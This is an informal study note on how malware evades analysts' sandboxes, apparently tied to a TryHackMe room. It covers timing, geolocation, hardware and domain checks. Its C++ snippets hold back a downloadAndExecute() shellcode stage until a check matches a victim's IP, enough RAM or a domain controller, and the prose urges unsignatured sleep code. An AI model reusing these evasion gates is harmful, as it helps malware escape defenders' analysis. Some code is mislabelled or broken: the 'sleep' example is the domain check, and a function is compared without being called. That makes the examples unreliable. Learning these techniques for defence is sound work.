# Sandbox Evasion

## Introduction

Sandboxes allow Malware Analysts to perform Dynamic Analysis that is more representive of the actual execution chain of a piece of malware by creating of safe and containize or virtualisd environment for the malware to operate in to then monitor it. Sandboxs within network meaning that any unsafe or suspicious file run simulatively without causing harm before it is run on a production system. Evasion therefore is imperative for the success of a strain malware as it must preemptively defend against dynamic analysis. 

As with all infinite Malware Dev Vs Analysist esculation of complexity this article will almost certianly become outdated and probably from my limit time to research it is already outdated. The key lesson to take away from any known knowns and general systemic presuppositions about how both parties exist and their objectives is:

**This next statement(s) is just a rough splattering of what I am trying to state here and will be edited to make it less of a ramble or philophical skid mark** - just a note for me and warning to others.
1. Metaness of contexts of how either Dev or Analyst use the knowable finite architecture, code, etc no matter how effective, each party continues to seek and utilise (meta/assumptative)information about the other the evade the other to execute their goals.  

Throughout the article I try to reveal a three step 1. Malware does `X` due to Sandbox have `A` property, Blue team will do `Y` and Malware Dev could then do `Z`. This is just to replicate the esculative effect of adversial relationships with  opposing, but symbiotic objectives. No malware means no  analysis to be done. There will alway be malware therefore there will always be analystist to help defend against it, which means there will always be a esculation of capability.

## Sleeping through Sandboxes

Sandboxes are limited to time constraints to prevent overallocation of network resources. Implementing a sleep timer that waits.

1. Query the system time in a parallel thread.
2. Do compute heavy maths that will take certain amount of time.

**Mitigations** - Sandboxes may alter the system clocks, built-in sleep functions 

**Therefore** - Develop your own unique sleep function code that won't have a signature on.

[evasions.checkpoint.com](https://evasions.checkpoint.com/techniques/timing.html)
[joesecurity](https://www.joesecurity.org/blog/660946897093663167#)

## Geolocation

Sandboxes can be virtualise and therefore be located off-site and hosted by Anti-Virus Providers. If target company is `X` county but Malware is beaconing back from `Y` country, even if company is globally networked it would make little sense to not regionalise Sandboxing to allow more Malware Analysis to occur.

1. Geolocation filter, checks IP address block of target company is the same as located
	1. [ifconfig.me](https://ifconfig.me) - Retrieve current IP
	2. [https://rdap.arin.net/registry/ip/1.1.1.1](https://rdap.arin.net/registry/ip/1.1.1.1) - detirmine the ISP returned in json 

**Mitigations** - No internet for Malware

## Check System information
The system that is used for sandboxing will has characteristics of paid solutions and often reduced compute capacity as it used to quarantine malware for inspection.

**NOT AN EXHAUSTIVE LIST**
-   Storage Medium Serial Number
-   PC Hostname
-   BIOS/UEFI Version/Serial Number
-   Windows Product Key/OS Version
-   Network Adapter Information
-   Virtualization Checks
-   Current Signed in User

## Querying Network Objects
Almost no Malware Sandbox is domain joined for obvious reasons, or maybe static unretrievable dummy domain information 


## Example Code

#### Sleeping Through Sandbox
```cpp


int main() {
    if (isDomainController == TRUE) {
        downloadAndExecute();
    } else {
        cout << "Domain Controller Not Found!";
    }
} 

```


#### Geolocating Filter
```cpp
BOOL checkIP() {   
 // Declare the Website URL that we would like to vicit
    const char* websiteURL = "<https://ifconfig.me/ip>";   
 // Create an Internet Stream to access the website
    IStream* stream;   
 // Create a string variable where we will store the string data received from the website
    string s;   
  // Create a space in memory where we will store our IP Address
    char buff[35];   
    unsigned long bytesRead;   
 // Open an Internet stream to the remote website
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);   
 // While data is being sent from the webserver, write it to memory
    while (true) {       
        stream->Read(buff, 35, &bytesRead);       
        if (0U == bytesRead) {           
            break;       
        }       
        s.append(buff, bytesRead);   
    }   
  // Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check.
    if (s == "VICTIM_IP") {       
        return TRUE;   
    }   
    else {       
    return FALSE;   
    }
} 

int main(){
    if(checkIP() == TRUE){
        downloadAndExecute();
        return 0;
    }
    else {
        cout << "HTTP/418 - I'm a Teapot!";
        return 0;
    }
} 

```

#### Checking System Memory 
```cpp

#include <iostream>
#include <Windows.h>
using namespace std;
int main() {
// Declare the MEMORYSTATUSEX Struct    
   MEMORYSTATUSEX statex;
// Set the length of the struct to the size of the struct    
   statex.dwLength = sizeof(statex);
// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
   GlobalMemoryStatusEx(&statex);
// Print the physical memory installed on the system    
   cout << "There is " << statex.ullTotalPhys/1024/1024/1024 << "GiB of memory on the system.";
} 

BOOL memoryCheck() {
// This function will check and see if the system has 5+GB of RAM
// Declare the MEMORYSTATUSEX Struct    
    MEMORYSTATUSEX statex;
// Set the length of the struct to the size of the struct    
    statex.dwLength = sizeof(statex);
// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
    GlobalMemoryStatusEx(&statex);
// Checks if the System Memory is greater than 5.00GB    
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {        
       return TRUE;    
    } else {        
       return FALSE;
    }
}

int main() {
// Evaluates if the installed RAM amount is greater than 5.00 GB,
//if true download Shellcode, if false, exit the program.    
if (memoryCheck() == TRUE) {        
    downloadAndExecute();    
    } else {        
       exit;    
    }
return 0;
} 
```

#### Network Querying
```cpp
BOOL isDomainController(){
// Create a long pointer to Wide String for our DC Name to live in
    LPCWSTR dcName;  
// Query the NetGetDCName Win32 API for the Domain Controller Name
    NetGetDCName(NULL, NULL, (LPBYTE *) &dcName);
// Convert the DCName from a Wide String to a String
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
// Search if the UNC path is referenced in the dcNewName variable. If so, there is likely a Domain Controller present in the environment. If this is true, pass the check, else, fail.
    if ( dcNewName.find("\\\\"){
          return TRUE;
    } else {
          return FALSE;
    }
} 
		
int main() {
    if (isDomainController == TRUE) {
        downloadAndExecute();
    } else {
        cout << "Domain Controller Not Found!";
    }
} 

```

## References

[THM Sandbox Evasion Room](https://tryhackme.com/room/sandboxevasion)